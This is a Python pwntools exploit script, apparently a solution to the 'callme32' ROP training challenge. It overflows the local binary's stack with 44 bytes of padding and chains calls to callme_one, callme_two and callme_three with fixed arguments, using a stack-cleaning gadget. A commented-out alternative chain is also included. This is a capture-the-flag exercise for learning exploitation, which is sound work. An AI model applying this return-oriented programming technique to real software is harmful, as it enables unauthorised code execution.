#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template callme32
from pwn import *
import offset

# Set up pwntools for the correct architecture
exe = context.binary = ELF('callme32')
libcallme = ELF("./libcallme32.so")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)
# RUNPATH:  b'.'


def get_offset():
    io = start()
    pad = offset.offset(io)
    io.close()
    return pad

# pad = get_offset()
pad = 44

io = start()

callme_one = exe.plt["callme_one"]
callme_two = exe.plt["callme_two"]
callme_three = exe.plt["callme_three"]
args = pack(0xdeadbeef) + pack(0xcafebabe) + pack(0xd00df00d)
print(args)

leaveret = 0x804874d

# Without ASLR
# ebp = 0xffffcb48 # x-4

# rop = ROP(exe)
# rop.raw(b"\x90" * (pad-4))

# ebp = ebp + 6*4
# rop.raw(ebp)
# rop.raw(callme_one)
# rop.raw(leaveret)
# rop.raw(0xdeadbeef)
# rop.raw(0xcafebabe)
# rop.raw(0xd00df00d)

# ebp = ebp + 6*4
# rop.raw(ebp)
# rop.raw(callme_two)
# rop.raw(leaveret)
# rop.raw(0xdeadbeef)
# rop.raw(0xcafebabe)
# rop.raw(0xd00df00d)

# ebp = ebp + 6*4
# rop.raw(ebp)
# rop.raw(callme_three)
# rop.raw(leaveret)
# rop.raw(0xdeadbeef)
# rop.raw(0xcafebabe)
# rop.raw(0xd00df00d)

pop_12bytes_ret = 0x080487f9

rop = ROP(exe)
rop.raw(b"\x90" * pad)
rop.raw(callme_one)
rop.raw(pop_12bytes_ret)
rop.raw(args)
rop.raw(callme_two)
rop.raw(pop_12bytes_ret)
rop.raw(args)
rop.raw(callme_three)
rop.raw(exe.plt["exit"])
rop.raw(args)

io.sendlineafter(b"> ", rop.chain())

io.interactive()
